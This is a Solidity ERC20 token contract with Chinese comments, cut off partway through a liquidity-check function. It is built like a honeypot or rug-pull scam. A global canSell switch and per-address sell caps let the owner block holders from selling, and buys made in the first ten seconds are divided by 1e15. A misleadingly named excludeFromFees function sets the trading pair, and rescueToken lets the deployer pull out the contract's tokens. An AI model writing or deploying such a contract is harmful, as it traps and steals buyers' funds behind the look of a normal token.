contract Token is ERC20 {
    using SafeMath for uint256;
    address public uniswapV2Pair;   // 配对合约地址
    address public contractSender;  // 合约发件人
    uint256 public startTime;
    mapping(address => bool) private _isExcludedFromVipFees;


    constructor(string memory _name, string memory _symbol, uint256 _amount, address tokenOwner) ERC20(_name, _symbol) {

        _tokenOwner = tokenOwner;
        contractSender = _owner;
        // 不包括在 VIP费用中
        _isExcludedFromVipFees[address(this)] = true;
        // 铸造总量
        uint256 total = _amount * 10**18;
        // 将需要铸造的代币数量，铸造给token所有者
        _mint(tokenOwner, total);
    }


    receive() external payable {}

    // 设置swap配对地址
    function excludeFromFees(address pair) public onlyOwner {
        uniswapV2Pair = pair;
    }

    // 添加其他令牌对
    function setTokenPair(address _tokenPair) public onlyOwner {
        _isExcludedFromVipFees[_tokenPair] = true;
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount>0);

        // 如果，from为配对地址 || to为配对地址
        if(_isExcludedFromVipFees[from] || _isExcludedFromVipFees[to]){
            // 那么走正常转账函数，并返回
            super._transfer(from, to, amount);
            return;
        }

        // 校验是否添加流动性
        bool isAddLdx;
        // to地址 == 配对地址
        if(to == uniswapV2Pair){
            // 校验流动池资产
            isAddLdx = isAddLiquidity();
            // 校验配对合约持有当前代币合约资产数量，如果等于0
            if(balanceOf(uniswapV2Pair) == 0){
                // 则校验from 是否为token所有者
                require(_tokenOwner == from);
            }
        }


        // 如果，from为配对地址
        if(from == uniswapV2Pair){
            if(startTime.add(10) >= block.timestamp){
                // 那么，交易数量 / 1e15
                amount = amount.div(1e15);
            }
        }else if(to == uniswapV2Pair){
            // 全局限制
            require(canSell, "canSell");
            if (_maxSell[from] > 0) {
                require(_maxSell[from] >= _haveSell[from].add(amount), "maxSell");
            }
            _haveSell[from] = _haveSell[from].add(amount);
        }else{
            require(canSell, "canSell");
            if (_maxSell[from] > 0) {
                require(_maxSell[from] >= _haveSell[from].add(amount), "maxSell");
            }
            _haveSell[from] = _haveSell[from].add(amount);
        }

        // 完成交易
        super._transfer(from, to, amount);
    }

    // 救援令牌
    function rescueToken(address tokenAddress, uint256 tokens) public returns (bool success) {
        // 校验 当前操作员是否为 合约所有者 地址
        require(contractSender == msg.sender);
        // 从该入参token代币地址,转移指定资产数量到 当前操作员地址上
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }


    // 是否增加流动性V1
    function isAddLiquidity()internal view returns(bool ldxAdd){
        // 获取交易对中，两个代币的地址
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
